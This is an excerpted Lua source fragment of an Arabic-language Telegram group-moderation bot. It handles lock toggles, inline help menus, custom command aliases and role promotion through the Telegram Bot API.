DevALS:del(AFS..'ALS:Lock:GpRed'..data.chat_id_)
...
DevALS:set(AFS.."ALS:Del:Me"..data.chat_id_, true)
Text = "*☆︙تم تعطيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:del(AFS.."ALS:Del:Me"..data.chat_id_)
Text = "*☆︙تم تفعيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:set(AFS.."ALS:Kick:Me"..data.chat_id_, true)
...
DevALS:del(AFS.."ALS:Kick:Me"..data.chat_id_)
...
DevALS:set(AFS.."ALS:Lock:KickBan"..data.chat_id_,"true")
Text = "*☆︙تم تعطيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:del(AFS.."ALS:Lock:KickBan"..data.chat_id_)
Text = "*☆︙تم تفعيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:set(AFS.."ALS:Lock:ProSet"..data.chat_id_,"true")
Text = "*☆︙تم تعطيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:del(AFS.."ALS:Lock:ProSet"..data.chat_id_)
Text = "*☆︙تم تفعيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:set(AFS..'ALS:Lock:Games'..data.chat_id_,true)  
...
DevALS:del(AFS..'ALS:Lock:Games'..data.chat_id_) 
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Help = DevALS:get(AFS..'ALS:Help')
local Text = [[
☆︙ها هلو في قائمة الاوامر ↫ ⤈ 
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
☆︙م1 ↫ اوامر الحمايه
☆︙م2 ↫ اوامر الادمنيه
☆︙م3 ↫ اوامر المدراء
...
local Help = DevALS:get(AFS..'ALS:Help1')
local Text = [[
☆︙اوامر حماية الكروب ↫ ⤈
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
☆︙قفل • فتح ↫ الروابط
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ عذرا الامر ليس لك .")..'&show_alert=true')
end
...
local Help = DevALS:get(AFS..'ALS:Help2')
local Text = [[
☆︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
☆︙الاعدادت
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ عذرا الامر ليس لك .")..'&show_alert=true')
end
...
local Help = DevALS:get(AFS..'ALS:Help3')
local Text = [[
☆︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
☆︙فحص البوت
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ عذرا الامر ليس لك .")..'&show_alert=true')
end
...
local Help = DevALS:get(AFS..'ALS:Help4')
local Text = [[
☆︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
☆︙تنزيل الكل
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ عذرا الامر ليس لك .")..'&show_alert=true')
end
...
local Help = DevALS:get(AFS..'ALS:Help5')
local Text = [[
☆︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
☆︙الكروبات
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ عذرا الامر ليس لك .")..'&show_alert=true')
end
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Help = DevALS:get(AFS..'ALS:Help6')
local Text = [[
☆︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ عذرا الامر ليس لك .")..'&show_alert=true')
end
...
if text and DevALS:get(AFS.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevALS:get(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevALS:del(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevALS:del(AFS.."Set:Cmd:Group:New"..msg.chat_id_)
DevALS:srem(AFS.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حذف الامر من الكروب", 1, 'html')  
else
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙لايوجد امر بهذا الاسم", 1, 'html')
end
DevALS:del(AFS.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevALS:get(AFS..'ALS:NameBot') or "يوكا")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevALS:get(AFS..'ALS:NameBot') or "يوكا")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevALS:get(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevALS:get(AFS.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevALS:set(AFS.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙ارسل الامر الجديد", 1, 'html')
DevALS:del(AFS.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevALS:set(AFS.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevALS:get(AFS.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevALS:get(AFS.."Set:Cmd:Group:New"..msg.chat_id_)
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الامر", 1, 'html')
DevALS:del(AFS.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevALS:smembers(AFS.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "☆︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevALS:get(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="مسح الاوامر المضافه",callback_data="/DelCmd:"..msg.sender_user_id_},{text="ترتيب الاوامر",callback_data="/SetCmd:"..msg.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
...
local List = DevALS:smembers(AFS.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevALS:del(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevALS:del(AFS.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حذف الاوامر المضافه في الكروب", 1, 'html')
end
if text == "حذف الاوامر المضافه" and ChCheck(msg) or text == "حذف الاوامر" and ChCheck(msg) or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local List = DevALS:smembers(AFS.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
...
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevALS:set(AFS.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevALS:sadd(AFS.."List:Cmd:Group:New"..msg.chat_id_,"#")
send(msg.chat_id_, msg.id_,"☆︙تم ترتيب الاوامر بالشكل التالي ~\n☆︙ ايدي - ا .\n☆︙ رفع مميز - م .\n☆︙رفع ادمن - اد .\n☆︙ رفع مدير - مد . \n☆︙ رفع منشى - من . \n☆︙ رفع منشئ الاساسي - اس  .\n☆︙ رفع مطور - مط .\n☆︙رفع مطور ثانوي - ثانوي .\n☆︙ تنزيل الكل - تك .\n☆︙ تعطيل الايدي بالصوره - تعط .\n☆︙ تفعيل الايدي بالصوره - تفع .\n☆︙ الرابط - ر .\n☆︙ ردود المدير - رر .\n☆︙ مسح المكتومين - ،، .\n☆︙ اضف رد - رد .\n☆︙ مسح سحكاتي - سح .\n☆︙ مسح رسائلي - رس .\n☆︙ غنيلي - غ .\n☆︙مسح قائمه العام")  
end
if text == "اضف امر" and ChCheck(msg) or text == "اضافة امر" and ChCheck(msg) or text == "اضافه امر" and ChCheck(msg) then
DevALS:set(AFS.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
DevALS:set(AFS.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
local List = DevALS:smembers(AFS.."Coomds"..msg.chat_id_)
if #List == 0 then
...
for k,v in pairs(List) do
var = DevALS:get(AFS.."Comd:New:rt:ALS:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
...
local List = DevALS:smembers(AFS.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevALS:del(AFS.."Comd:New:rt:ALS:"..v..msg.chat_id_)
DevALS:del(AFS.."Coomds"..msg.chat_id_)
end
...
DevALS:set(AFS.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevALS:sadd(AFS.."Coomds"..msg.chat_id_,ComdNew)  
DevALS:setex(AFS.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n☆︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevALS:del(AFS.."Comd:New:rt:ALS:"..ComdNew..msg.chat_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حذف الصلاحيه", 1, 'html')
end
if DevALS:get(AFS.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ☆$") then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء الامر", 1, 'html')
DevALS:del(AFS.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
...
local textn = DevALS:get(AFS.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevALS:set(AFS.."Comd:New:rt:ALS:"..textn..msg.chat_id_,text)
...
if DevALS:sismember(AFS.."Coomds"..msg.chat_id_,DEV_ALS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrALS = DevALS:get(AFS.."Comd:New:rt:ALS:"..DEV_ALS..msg.chat_id_)
if mrALS == "مميز" and VipMem(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n☆︙تم رفعه ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
DevALS:set(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ALS) 
DevALS:sadd(AFS..'ALS:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrALS == "ادمن" and Admin(msg) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n☆︙تم رفعه ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
DevALS:set(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ALS)
DevALS:sadd(AFS..'ALS:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrALS == "مدير" and Manager(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n☆︙تم رفعه ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
DevALS:set(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ALS)  
DevALS:sadd(AFS..'ALS:Managers:'..msg.chat_id_, result.sender_user_id_)
...
DevALS:srem(AFS..'ALS:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevALS:del(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrALS == "ادمن" and Admin(msg) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n☆︙تم تنزيله ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
DevALS:srem(AFS..'ALS:Admins:'..msg.chat_id_, result.sender_user_id_)
DevALS:del(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrALS == "مدير" and Manager(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n☆︙تم تنزيله ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
DevALS:srem(AFS..'ALS:Managers:'..msg.chat_id_, result.sender_user_id_)
DevALS:del(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrALS == "عضو" then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n☆︙تم تنزيله ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
end
...
if DevALS:sismember(AFS.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrALS = DevALS:get(AFS.."Comd:New:rt:ALS:"..text1[2]..msg.chat_id_)
if mrALS == "مميز" and VipMem(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n☆︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevALS:sadd(AFS..'ALS:VipMem:'..msg.chat_id_, result.id_)
DevALS:set(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrALS == "ادمن" and Admin(msg) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n☆︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevALS:sadd(AFS..'ALS:Admins:'..msg.chat_id_, result.id_)
DevALS:set(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrALS == "مدير" and Manager(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n☆︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevALS:sadd(AFS..'ALS:Managers:'..msg.chat_id_, result.id_)
DevALS:set(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrALS == "عضو" then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n☆︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevALS:srem(AFS..'ALS:VipMem:'..msg.chat_id_, result.id_)
DevALS:del(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrALS == "ادمن" and Admin(msg) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n☆︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevALS:srem(AFS..'ALS:Admins:'..msg.chat_id_, result.id_)
DevALS:del(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrALS == "مدير" and Manager(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n☆︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevALS:srem(AFS..'ALS:Managers:'..msg.chat_id_, result.id_)
DevALS:del(AFS.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrALS == "عضو" then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n☆︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevALS:incr(AFS..'ALS:UsersMsgs'..AFS..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevALS:incr(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevALS:incr(AFS..'ALS:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevALS:sismember(AFS.."ALS:Users",msg.chat_id_) then
DevALS:sadd(AFS.."ALS:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
...
local Sudo_Welcome = '☆︙مرحبا عزيزي المطور \n☆︙انت المطور الاساسي هنا \n☆︙ هاك ضلعي  ازرار سورس يوكا \n☆︙تستطيع التحكم بكل الاوامر فقط دوس على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي المطور \n☆︙ هاك ضلعي  الازرار الخاصه بتعديل وتغيير كلايش سورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
{'تغير معلومات الترحيب'},
...
if text == '↫ السورس ☆' then 
if SecondSudo(msg) then 
